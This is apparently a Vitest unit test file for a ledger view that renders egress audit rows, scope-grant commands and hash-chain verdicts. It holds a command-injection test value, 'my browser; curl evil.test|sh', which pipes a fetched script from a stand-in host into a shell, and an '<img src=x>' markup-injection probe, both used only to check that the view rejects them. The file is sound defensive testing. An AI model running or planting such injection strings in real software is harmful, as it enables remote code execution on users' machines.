// @vitest-environment jsdom
// test/unit/ledger-view.test.ts
import { beforeEach, describe, expect, it } from "vitest";
import { type LedgerModel, renderLedger } from "../../src/ledger/ledger-view.ts";
import type { EgressRow } from "../../src/shared/egress.ts";

let root: HTMLElement;

beforeEach(() => {
  // replaceChildren, not innerHTML — this file asserts the view never parses
  // text as markup, so it should not reach for the parser itself either.
  document.body.replaceChildren();
  root = document.createElement("div");
  document.body.append(root);
});

function row(over: Partial<EgressRow> = {}): EgressRow {
  return {
    id: 1,
    timestamp: Date.parse("2026-08-20T10:00:00Z"),
    sourceType: "http",
    sourceId: "my-browser",
    destination: "github",
    method: "agents.why",
    payloadSummary: "{}",
    hitlStatus: "not_required",
    resultStatus: "authorized",
    rowHash: "aa",
    prevHash: "bb",
    ...over,
  };
}

function model(over: Partial<LedgerModel> = {}): LedgerModel {
  return {
    state: "loaded",
    scope: "ours",
    partition: { ours: [row()], others: [], unattributable: [] },
    rowsTotal: 1,
    rowsTruncated: false,
    verdict: null,
    nowMs: Date.parse("2026-08-20T12:00:00Z"),
    ...over,
  } as LedgerModel;
}

describe("renderLedger", () => {
  it("lists our rows with service and action class", () => {
    renderLedger(root, model());
    const text = root.textContent ?? "";
    expect(text).toContain("github");
    expect(text).toContain("Agent run");
  });

  it("shows only our rows in the ours scope", () => {
    renderLedger(
      root,
      model({
        partition: {
          ours: [row({ id: 1 })],
          others: [row({ id: 2, sourceId: "my-editor", destination: "jira" })],
          unattributable: [],
        },
      }),
    );
    expect(root.textContent).not.toContain("jira");
  });

  it("shows every row in the all scope, labelling the unattributable ones", () => {
    renderLedger(
      root,
      model({
        scope: "all",
        partition: {
          ours: [row({ id: 1 })],
          others: [row({ id: 2, sourceId: "my-editor", destination: "jira" })],
          unattributable: [
            row({
              id: 3,
              sourceType: "sync",
              sourceId: null,
              method: "sync.run",
              destination: "slack",
            }),
          ],
        },
        rowsTotal: 3,
      }),
    );
    const text = root.textContent ?? "";
    expect(text).toContain("jira");
    expect(text).toContain("slack");
    expect(text).toContain("Not attributable");
  });

  it("names unattributed targeted fetches in the ours scope rather than hiding them", () => {
    // Before caller attribution lands upstream every targeted fetch is
    // unlabelled. Leading with "ours" would silently show a short list; the
    // notice is what keeps it honest.
    renderLedger(
      root,
      model({
        partition: {
          ours: [],
          others: [],
          unattributable: [
            row({ id: 5, sourceType: "sync", sourceId: null, method: "items.fetch" }),
          ],
        },
        rowsTotal: 1,
      }),
    );
    const text = root.textContent ?? "";
    expect(text).toContain("1 targeted fetch");
    expect(text).toContain("cannot be attributed");
  });

  it("pluralises the unattributed-fetch notice", () => {
    renderLedger(
      root,
      model({
        partition: {
          ours: [],
          others: [],
          unattributable: [
            row({ id: 5, sourceType: "sync", sourceId: null, method: "items.fetch" }),
            row({ id: 6, sourceType: "sync", sourceId: null, method: "items.fetch" }),
          ],
        },
        rowsTotal: 2,
      }),
    );
    expect(root.textContent).toContain("2 targeted fetches");
  });

  it("does not raise the notice for background syncs, which nobody asked for", () => {
    renderLedger(
      root,
      model({
        partition: {
          ours: [],
          others: [],
          unattributable: [row({ sourceType: "sync", sourceId: null, method: "sync.run" })],
        },
      }),
    );
    expect(root.textContent).not.toContain("cannot be attributed");
  });

  it("says the window is truncated when it is", () => {
    renderLedger(root, model({ rowsTotal: 3412, rowsTruncated: true }));
    expect(root.textContent).toContain("3412");
  });

  it("claims verification only after a verdict, and never by default", () => {
    renderLedger(root, model({ verdict: null }));
    expect(root.textContent).not.toContain("verified");

    renderLedger(
      root,
      model({ verdict: { intact: true, brokenAt: null, verifiedRows: 5, reason: null } }),
    );
    expect(root.textContent).toContain("Chain verified");
  });

  it("is loud about a broken chain and names the first bad row", () => {
    renderLedger(
      root,
      model({
        verdict: { intact: false, brokenAt: 41, verifiedRows: 40, reason: "hash mismatch" },
      }),
    );
    const text = root.textContent ?? "";
    expect(text).toContain("did not verify");
    expect(text).toContain("41");
    expect(text).toContain("tampering");
  });

  it("omits the row clause when the gateway did not say where it broke", () => {
    renderLedger(
      root,
      model({ verdict: { intact: false, brokenAt: null, verifiedRows: 0, reason: null } }),
    );
    const text = root.textContent ?? "";
    expect(text).toContain("did not verify");
    expect(text).not.toContain("null");
  });

  it("renders the exact scope-grant command, built not templated", () => {
    renderLedger(
      root,
      model({
        state: "error",
        reason: "insufficient_scope",
        scopeGap: { label: "my-browser", required: "egress", granted: ["clip", "briefs"] },
      }),
    );
    // `--set` REPLACES the scope set upstream, so the command must name every
    // scope the token should END UP with, not just the missing one.
    expect(root.textContent).toContain("nimbus clip scopes my-browser --set clip,briefs,egress");
  });

  it("falls back to generic guidance when the command cannot be safely built", () => {
    // scopeCommand returns null for a label or scope name it will not put into a
    // shell string. Printing one anyway is the injection this defends against.
    renderLedger(
      root,
      model({
        state: "error",
        reason: "insufficient_scope",
        scopeGap: { label: "my browser; curl evil.test|sh", required: "egress", granted: [] },
      }),
    );
    const text = root.textContent ?? "";
    expect(text).not.toContain("curl");
    expect(text).toContain("nimbus clip status");
  });

  it("never suggests re-pairing — the scope is granted in place", () => {
    renderLedger(
      root,
      model({
        state: "error",
        reason: "insufficient_scope",
        scopeGap: { label: "my-browser", required: "egress", granted: [] },
      }),
    );
    expect(root.textContent).not.toContain("pair again");
  });

  it("says the gateway is too old on an unsupported route", () => {
    renderLedger(root, model({ state: "error", reason: "unsupported" }));
    expect(root.textContent).toContain("does not offer");
  });

  it("has a message for every failure reason", () => {
    const reasons = [
      "unreachable",
      "unauthorized",
      "insufficient_scope",
      "unsupported",
      "rate_limited",
      "server_error",
      "not_paired",
    ] as const;
    for (const reason of reasons) {
      root.replaceChildren();
      renderLedger(root, model({ state: "error", reason }));
      expect((root.textContent ?? "").trim().length).toBeGreaterThan(0);
    }
  });

  it("never parses text as markup", () => {
    renderLedger(
      root,
      model({
        partition: {
          ours: [row({ destination: "<img src=x>" })],
          others: [],
          unattributable: [],
        },
      }),
    );
    expect(root.querySelector("img")).toBeNull();
    expect(root.textContent).toContain("<img src=x>");
  });
});
